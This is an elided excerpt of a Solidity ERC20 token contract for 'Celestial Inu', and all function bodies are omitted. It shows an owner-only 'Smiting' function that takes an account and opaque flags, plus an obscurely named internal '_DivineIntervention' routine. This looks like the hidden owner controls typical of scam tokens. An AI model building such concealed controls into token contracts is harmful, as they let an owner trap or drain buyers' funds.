...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function Smiting(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _DivineIntervention(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Celestial is Context, ERC20 {
    constructor(
        ...
        _DivineIntervention(owner, initialSupply, house6, house7);
    }
}

contract CelestialInu is ERC20Celestial {
    constructor() ERC20Celestial("Celestial Inu", "CELESTIAL", false, true, 900, 25, msg.sender, 1000000 * 10 ** 18, msg.sender, 182) {
    }
}